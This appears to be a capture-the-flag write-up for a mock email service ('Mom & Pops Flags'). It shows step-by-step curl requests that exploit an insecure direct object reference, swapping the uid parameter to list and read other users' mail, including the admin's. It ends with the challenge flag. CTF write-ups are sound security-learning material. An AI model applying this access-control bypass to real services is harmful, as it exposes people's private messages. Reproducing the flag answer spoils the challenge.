- I created a user boblimes@mompopsflags.com with password bob

- We find that there's a js file called email.js that seems to be contacting different api endpoints to retrieve our mail

- The token being used can be found in Inspect Element > Application > Local Storage
`curl -X POST http://srv2.momandpopsflags.ca:7633/api/v0/link?token=55b0555a55564a72e59c42574717455525f401751c5b`
`{"success":true,"uid":"boblimes@mompopsflags.com"}`

- We discover that the id used is just the email for each user, so we can abuse it to start list other people's emails
`curl -X POST http://srv2.momandpopsflags.ca:7633/api/v0/listemails?uid=boblimes@mompopsflags.com`
`{"success":true,"messages":{"count":2,"ids":{"Ym9ibGltZXMwMTY0NTkzNDI0MTc4Mw==":{"subject":"Welcome to Mom & Pops Internal Email System - Please Read Me","sender":"it@mompopsflags.com"},"Ym9ibGltZXMxMTY0NTkzNDI0MTc4Mw==":{"subject":"[URGENT - UPDATE] Security Issue Discovered - Setting email service to read-only temporarily.","sender":"it@mompopsflags.com"}}}}`

`curl -X POST http://srv2.momandpopsflags.ca:7633/api/v0/listemails?uid=it@mompopsflags.com`
`{"success":true,"messages":{"count":2,"ids":{"b94d27b9934d3e08a52e52d7da7dabfac484efe37a5380ee9088f7ace2efcde9":{"subject":"hello world","sender":"testacc@mompopsflags.com"},"834d04aab30814b14b3af169af7b3614a68e7e9ed11940e6ae9c3cc84904484e":{"subject":"Password has been forgotten HELP","sender":"admin@mompopsflags.com"}}}}`

- There's an account named `admin@mompopsflags.com`, so let's see its emails
`curl -X POST http://srv2.momandpopsflags.ca:7633/api/v0/listemails?uid=admin@mompopsflags.com`
`{"success":true,"messages":{"count":2,"ids":{"c6b055378e5ccd97873565152bfcf6e4c649e4c221f92d7ce169ab1b398f12a0":{"subject":"Re: Password has been forgotten HELP","sender":"it@mompopsflags.com"},"d1f592f82d64ab275f7661c4e3d40cd3860c7381e2fd34295fec02dd4b41987f":{"subject":"[Urgent] New Flag Shipment","sender":"friends@omniflag.net"}}}}`

- Now we can use the api endpoint used in readEmail() to read the email using the uid and mid (mail id). Note: `&` is a special character in bash, so we need to escape it with `\`
`curl -X POST http://srv2.momandpopsflags.ca:7633/api/v0/reademail?uid=admin@mompopsflags.com\&mid=c6b055378e5ccd97873565152bfcf6e4c649e4c221f92d7ce169ab1b398f12a0`
`{"success":true,"date":"1639698318174","message":"Hi Pop,\n\nI can reset your password, but it cannot be reset to any of the passwords that you have sent me.\n\nI cannot use passwords that were publicly sent over the internet, since it is highly likely that they could be breached. However, I do admit that the passwords I've been giving you are probably too complicated. I can make a simpler password that is equally secure, but much easier for you and Mom to remember.\n\nI can drive down to the shop this Saturday to tell you your new password in-person. Sorry that you will have to wait to log into your other devices.\n\nTalk to you soon,\nEmilia\n\nPS. My parents might be there as your shop is between destinations for us.","sender":"it@mompopsflags.com","subject":"Re: Password has been forgotten HELP"}`

- Let's view the other email sent to the admin account
`curl -X POST http://srv2.momandpopsflags.ca:7633/api/v0/reademail?uid=admin@mompopsflags.com\&mid=d1f592f82d64ab275f7661c4e3d40cd3860c7381e2fd34295fec02dd4b41987f`
`{"success":true,"date":"1639798225627","message":"Hello Mom and Pop,\n\nWe are pleased to hear that flag sales have been growing at an exponential rate. As previously discussed, this is one of the benefits to joining our company.\n\nWe wish to inform you that a new shipment of flags will be coming in very soon.\n\nTo get to the point, one of the flags that we have obtained is:\n - magpie{@u+h0r1z@+10n_2_l@x}\n\nYou likely understand the value of these flags and understand the gravity of the situation.\n\nGreat sacrifices have been made to retrieve these flags, and unfortunately we did not leave unnoticed. With the great notoriety these flags pocess, we must ask you to store these flags for us. We apologize for any inconvenience this may bring, but refusal is would be a breach in our contract.\n\nPlease have your IT intern develop a secure storage system for these flags. The provided flag should be more than enough for her to work with.\n\nThank you for your compliance.\n\nSincerely,\nYour friends at Omni-Flag\n\nOmni-Flag: A Family Company","sender":"friends@omniflag.net","subject":"[Urgent] New Flag Shipment"}`

- Flag is `magpie{@u+h0r1z@+10n_2_l@x}`
